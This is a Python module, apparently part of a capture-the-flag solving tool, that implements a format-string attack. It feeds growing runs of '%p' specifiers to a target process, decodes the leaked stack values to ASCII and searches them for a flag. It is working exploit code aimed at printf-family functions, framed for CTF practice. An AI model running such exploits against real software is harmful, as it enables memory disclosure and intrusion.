import sys
from typing import List
from exploits.exploit import Exploit
from util.hex_decoder import convert_hex_to_ascii, filter_hex_values


class StringFormatAttack(Exploit):
    def __init__(self, max_tries):
        super().__init__(max_tries)

        self._name = "string format attack"
        self._vulnerable_functions = [
            "fprint",
            "printf",
            "sprintf",
            "snprintf",
            "vfprintf",
            "vprintf",
            "vsprintf",
            "vsnprintf",
        ]
        self.failed_attempts = 0
        self.max_inner_tries = 5

    @property
    def name(self) -> str:
        return self._name

    @property
    def vulnerable_functions(self) -> List[str]:
        return self._vulnerable_functions

    def exploit(self, process, iteration):
        input_str = " ".join(["%p"] * iteration) + "\n"

        process.stdin.write(input_str)
        process.stdin.flush()

        output = process.stdout.read()
        hex_values = filter_hex_values(output)
        ascii_values = [convert_hex_to_ascii(hex_val) for hex_val in hex_values]

        ascii_values = [value[::-1] for value in ascii_values]

        flag = self.flag_finder.search_for_flag_in_list(ascii_values)

        if flag:
            print(
                f"Flag has been found using this input:\n{input_str}\noutput:\n{output}\n{flag}"
            )
            sys.exit()

        if (
            len(ascii_values) != iteration
            and self.failed_attempts >= self.max_inner_tries
        ):
            return True

        return False
